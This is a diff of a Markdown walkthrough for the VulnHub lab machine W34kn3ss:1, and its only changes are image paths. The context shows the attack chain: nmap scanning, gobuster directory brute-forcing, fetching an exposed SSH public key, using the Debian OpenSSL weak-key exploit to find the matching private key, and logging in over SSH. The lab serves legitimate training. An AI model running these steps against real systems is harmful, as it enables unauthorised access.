@@ -3,7 +3,7 @@
 - **Machine:** W34kn3ss: 1
 - **Download:** https://www.vulnhub.com/entry/w34kn3ss-1,270/
 
-![](848-1.png)
+![](images/848-1.png)
 
 ---
 
@@ -25,7 +25,7 @@ Identify the target machine on the local network.
 nmap -sn 192.168.2.0/24
 ```
 
-![](848-2.png)
+![](images/848-2.png)
 
 ---
 
@@ -37,7 +37,7 @@ Perform a complete TCP scan with service detection, operating system detection, 
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.249
 ```
 
-![](848-3.png)
+![](images/848-3.png)
 
 ---
 
@@ -65,7 +65,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.249
 ```
 
-![](848-4.png)
+![](images/848-4.png)
 
 ---
 
@@ -85,7 +85,7 @@ https://192.168.2.249/
 http://192.168.2.249/test/
 ```
 
-![](848-5.png)
+![](images/848-5.png)
 
 ---
 
@@ -103,7 +103,7 @@ Example entry:
 192.168.2.249 weakness.jth
 ```
 
-![](848-6.png)
+![](images/848-6.png)
 
 Browse the virtual host.
 
@@ -111,7 +111,7 @@ Browse the virtual host.
 http://weakness.jth/
 ```
 
-![](848-7.png)
+![](images/848-7.png)
 
 A clue is displayed:
 
@@ -129,7 +129,7 @@ Perform directory brute-forcing.
 gobuster dir -u http://weakness.jth/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 
-![](848-8.png)
+![](images/848-8.png)
 
 Discovered endpoints:
 
@@ -141,7 +141,7 @@ http://weakness.jth/robots.txt
 http://weakness.jth/private/
 ```
 
-![](848-9.png)
+![](images/848-9.png)
 
 ---
 
@@ -157,7 +157,7 @@ wget http://weakness.jth/private/files/mykey.pub
 wget http://weakness.jth/private/files/notes.txt
 ```
 
-![](848-10.png)
+![](images/848-10.png)
 
 The public SSH key will later be used to recover its matching private key.
 
@@ -171,7 +171,7 @@ Search for the historical OpenSSL Debian vulnerability.
 searchsploit openssl 0.9.8c-1
 ```
 
-![](848-11.png)
+![](images/848-11.png)
 
 Display the exploit information.
 
@@ -179,7 +179,7 @@ Display the exploit information.
 searchsploit -x 5622
 ```
 
-![](848-12.png)
+![](images/848-12.png)
 
 Extract the archive.
 
@@ -206,7 +206,7 @@ Command explanation:
 | `-r` | Search recursively through directories |
 | `-l` | Display only matching filenames |
 
-![](848-13.png)
+![](images/848-13.png)
 
 The matching filename is the corresponding private SSH key.
 
@@ -222,7 +222,7 @@ ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth
 
 Successful login is obtained.
 
-![](848-14.png)
+![](images/848-14.png)
 
 ---
 
